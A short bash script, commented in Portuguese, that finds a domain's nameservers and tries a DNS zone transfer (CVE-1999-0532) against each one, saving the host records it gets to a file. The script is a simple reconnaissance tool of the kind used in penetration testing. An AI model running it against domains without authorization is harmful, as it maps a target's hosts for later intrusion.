#!/bin/bash
#    Copyright Alcyon Junior a.k.a. PhYsHyOn
#    http://www.portaltic.com
#    This code is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#    This code is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>
if [ -z "$1" ]; then
echo "Script para simples transferencia de zona de dns (CVE-1999-0532)" 
echo "Uso : $0 <nome dominio>" 
echo "Exemplo: $0 portaltic.com"
exit 0
print Uso
fi
clear
echo "=================="
echo "O alvo é $1"
echo "=================="
echo " " 
# Tentando identificar os DNS Servers 
for server in $(host -t ns $1 | cut -d" " -f4);do
echo "# Realizando ZoneTransfer no DNS $server"
# Tentando realizar o ZoneTransfers para cada DNS Server
host -l $1 $server | grep "has address" >> $1.txt
done
echo "  "
echo "[*] Os resultados estão no arquivo: $1.txt"
echo "  "
